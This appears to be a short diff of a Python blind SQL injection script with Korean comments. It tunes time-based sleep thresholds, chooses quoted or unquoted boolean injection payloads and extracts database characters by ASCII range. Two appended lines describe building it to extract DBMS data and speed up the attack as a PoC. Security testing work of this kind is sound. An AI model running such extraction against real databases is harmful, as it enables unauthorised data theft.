@@ -88,11 +88,11 @@ def _init_sleep_time():
     global _time_to_sleep
     multiplier = {0: 2.5, 1: 3.5, 2: 4.5, 3: 5.5}
     _time_to_sleep = multiplier.get(_mode, 2.5) * _ref_resp_time
-    print(f'[*] 주입 시 대기 시간 설정: {_time_to_sleep:.3f} 초')
+    print(f'[*] 주입 대기 시간 설정: {_time_to_sleep:.3f} 초')
 
 # 특정 인덱스의 문자 추출 및 디코딩 처리
 def _get_char(row, index):
-    min_index, max_index = 32, 126  # ASCII 코드 범위 설정
+    min_index, max_index = 32, 126
     params = dict(_payload)
     injection = _bool_injections["unquoted"]["char"] if _is_number(_payload.get(_param, "")) else _bool_injections["quoted"]["char"]
 
@@ -172,3 +172,7 @@ if __name__ == "__main__":
     _init_ref_resp_time()
     _init_sleep_time()
     _get_all_rows(args.output_file)
+
+
+- DBMS 데이터 추출을 위한 자동화 스크립트(python 기반) 제작 및 공격 진행
+- 공격 속도 최적화를 위한 알고리즘 개선 및 PoC 과정 기술
